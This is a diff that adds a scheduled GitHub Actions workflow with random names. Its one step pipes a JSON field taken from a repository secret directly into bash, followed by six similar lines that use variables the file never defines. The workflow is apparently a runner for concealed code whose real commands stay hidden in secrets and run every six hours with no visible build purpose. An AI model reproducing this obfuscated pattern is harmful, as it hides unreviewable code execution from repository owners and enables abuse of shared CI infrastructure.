@@ -1,0 +1,24 @@
+name: xiaodafeng3216
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaodafeng3216
+        env:
+          uo90: ${{ secrets.uo90 }}
+        run: |
+          echo $uo90 | jq -r .gqvom2564 | /bin/bash
+          echo $cegj3674 | jq -r .l7 | /bin/bash
+          echo $bef9 | jq -r .du68637 | /bin/bash
+          echo $y171 | jq -r .z0421 | /bin/bash
+          echo $zqc273 | jq -r .i1 | /bin/bash
+          echo $gbj73 | jq -r .pj33 | /bin/bash
+          echo $qtu9583 | jq -r .t2499 | /bin/bash
+
